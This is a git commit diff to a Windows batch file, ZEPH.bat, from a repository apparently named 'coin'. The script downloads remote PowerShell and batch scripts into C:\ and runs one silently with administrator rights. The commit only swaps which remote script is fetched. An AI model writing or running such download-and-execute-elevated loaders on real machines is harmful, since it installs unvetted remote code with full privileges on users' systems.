f27777c52a689a21e57eb6a8d718eb7f7e798d9a
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-05 19:42:33 +0700

    ZEPH.bat

--- ZEPH.bat
+++ ZEPH.bat
@@ -1,5 +1,5 @@
 @echo off
-powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1' -OutFile 'C:\ZEPHSETUP.ps1'"
+powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/ZEPHSETUP.ps1' -OutFile 'C:\ZEPHSETUP.ps1'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS.bat' -OutFile 'C:\RUNSYS.bat'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\RUNSYS.bat' -ArgumentList '/S' -Verb RunAs"
 exit
